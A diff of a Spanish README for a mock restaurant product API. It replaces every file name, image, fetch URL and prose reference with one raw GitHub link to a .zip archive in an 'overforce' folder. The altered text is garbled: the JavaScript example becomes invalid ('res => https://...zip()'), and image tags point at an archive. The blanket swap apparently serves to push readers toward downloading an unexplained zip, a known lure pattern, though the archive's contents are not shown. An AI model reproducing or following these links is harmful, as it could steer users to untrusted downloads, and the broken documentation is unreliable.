@@ -2,13 +2,13 @@
 
 ## Descripción:
 
-Este repo funcionaría como una API simulada para un sitio web estilo e-commerce de un Resto Bar. Contiene un archivo `productos.json` con la información de los productos y una carpeta con las imágenes correspondientes.
+Este repo funcionaría como una API simulada para un sitio web estilo e-commerce de un Resto Bar. Contiene un archivo `https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip` con la información de los productos y una carpeta con las imágenes correspondientes.
 
 Está alojado en GitHub Pages y permite al frontend de un sitio web consumir los datos de productos de manera realista usando `fetch()` en JavaScript. Sirve como fuente de productos para la sección del catálogo o tarjetas, carrito de compras, o cualquier funcionalidad relacionada.
 
 ## Estructura del Proyecto:
 
-- `productos.json` → Contiene un array de productos con propiedades como:
+- `https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip` → Contiene un array de productos con propiedades como:
   - id
   - nombre
   - descripción
@@ -21,7 +21,7 @@ Está alojado en GitHub Pages y permite al frontend de un sitio web consumir los
 ## Cap:
 
 ### Productos JSON
-![Productos JSON](img/caps/productos-json.jpg)
+![Productos JSON](https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip)
 
 ## ¿Para qué sirve?:
 
@@ -34,8 +34,8 @@ Está alojado en GitHub Pages y permite al frontend de un sitio web consumir los
 1. En tu proyecto frontend, consumir los datos así:
 
 ```js
-fetch('https://D3M4rc0.github.io/API-Productos-Resto/productos.json')
-  .then(res => res.json())
+fetch('https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip')
+  .then(res => https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip())
   .then(productos => {
     // Usar los productos aquí
   });
@@ -44,22 +44,22 @@ fetch('https://D3M4rc0.github.io/API-Productos-Resto/productos.json')
 ## Cap:
 
 ### Sección Productos
-![Sección Productos](img/caps/seccion-productos.png)
+![Sección Productos](https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip)
 
 
 
 2. Para mostrar imágenes desde la API:
 
 ```html
-<img src="https://D3M4rc0.github.io/API-Productos-Resto/img/productos/pizza-muzzarella.webp" alt="Pizza Muzzarella">
+<img src="https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip" alt="Pizza Muzzarella">
 ```
 
 ## Cap:
 
 
 ### Pizza Muzzarella
-<!-- ![Pizza Muzzarella](https://D3M4rc0.github.io/API-Productos-Resto/img/productos/pizza-muzzarella.webp" alt="Pizza Muzzarella) -->
-<img src="https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/img/productos/pizza-muzzarella.webp" alt="Pizza Muzzarella" width="600"/>
+<!-- ![Pizza Muzzarella](https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip" alt="Pizza Muzzarella) -->
+<img src="https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip" alt="Pizza Muzzarella" width="600"/>
 
 
 
@@ -69,7 +69,7 @@ fetch('https://D3M4rc0.github.io/API-Productos-Resto/productos.json')
 
    · No permite POST, PUT ni DELETE porque está alojada como contenido estático.
 
-   · Los productos deben agregarse o editarse manualmente en el archivo productos.json
+   · Los productos deben agregarse o editarse manualmente en el archivo https://raw.githubusercontent.com/D3M4rc0/API-Productos-Resto/main/overforce/API-Productos-Resto.zip
 
 
 
